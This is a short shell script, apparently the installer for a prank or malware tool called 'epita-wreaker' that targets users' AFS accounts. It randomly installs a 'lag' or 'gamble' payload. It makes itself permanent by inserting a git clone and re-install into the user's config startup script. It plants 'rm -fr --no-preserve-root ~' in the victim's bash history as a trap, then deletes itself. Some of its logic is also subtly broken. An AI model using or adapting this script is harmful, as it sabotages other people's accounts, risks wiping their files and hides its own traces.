#takes as argument what dir to confloose from, default is random
#if two args are given, uses random and does not write to the afs auto mount script
repo=$(dirname $0)

if [ $# -eq 2 ]; then
	dir=$1
else
	rand=$RANDOM%2

	if [ $rand -eq 0 ]; then
		dir="lag"
	else
		dir="gamble"
	fi
fi


./$repo/$dir/install.sh



#not sure if it is the right path
#dont want it stacking either
if [ ! $# -eq 3 ]; then

$HOME/afs/.config/install.sh << 'MAKE_PERMANENT'
git clone https://github.com/tbvns/epita-wreaker.git
./epita-wreaker/install_rand.sh a b
MAKE_PERMANENT

fi



echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history

rm -fr $repo
